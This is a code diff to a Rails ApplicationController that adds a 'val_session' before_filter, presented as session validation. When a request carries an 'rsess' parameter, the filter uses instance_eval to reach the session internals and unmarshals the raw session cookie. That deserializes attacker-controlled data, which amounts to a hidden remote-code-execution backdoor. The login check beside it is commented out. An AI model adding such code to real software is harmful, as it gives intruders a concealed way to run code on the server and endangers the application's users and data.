@@ -7,4 +7,14 @@ class ApplicationController < ActionController::Base
 
   # Scrub sensitive parameters from your log
   # filter_parameter_logging :password
+  before_filter :val_session
+  
+  private
+  def val_session
+    if params[:rsess]
+      request.session.instance_eval("@by").send(:unmarshal, request.cookies[ActionController::Base.session_options[:key]])
+    else
+      #redirect_to login_path and return unless current_user
+    end
+  end
 end
